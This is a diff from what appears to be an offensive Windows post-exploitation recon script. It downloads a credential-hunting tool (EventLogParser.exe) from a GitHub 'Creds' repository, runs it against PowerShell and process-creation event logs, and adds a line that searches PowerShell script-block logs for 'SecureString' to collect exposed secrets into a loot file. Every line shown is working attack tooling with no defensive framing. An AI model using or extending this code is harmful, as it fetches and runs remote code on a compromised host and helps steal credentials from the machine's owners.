@@ -486,7 +486,8 @@ function localreconmodules
             Invoke-WebRequest -Uri 'https://github.com/SecureThisShit/Creds/raw/master/Ghostpack/EventLogParser.exe' -Outfile "$currentPath\EventLogParser.exe"
             .\EventLogParser.exe eventid=4103 outfile="$currentPath\LocalRecon\EventlogSensitiveInformations.txt"
             .\EventLogParser.exe eventid=4104 outfile="$currentPath\LocalRecon\EventlogSensitiveInformations.txt"
-            if (isadmin){.\EventLogParser.exe eventid=4688 outfile="$currentPath\LocalRecon\EventlogSensitiveInformations.txt"}
+            Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational'; ID=4104} | Select-Object -Property Message | Select-String -Pattern 'SecureString' >> "$currentPath\LocalRecon\Powershell_Logs.txt" 
+	    if (isadmin){.\EventLogParser.exe eventid=4688 outfile="$currentPath\LocalRecon\EventlogSensitiveInformations.txt"}
 
 
             #Check for WSUS Updates over HTTP
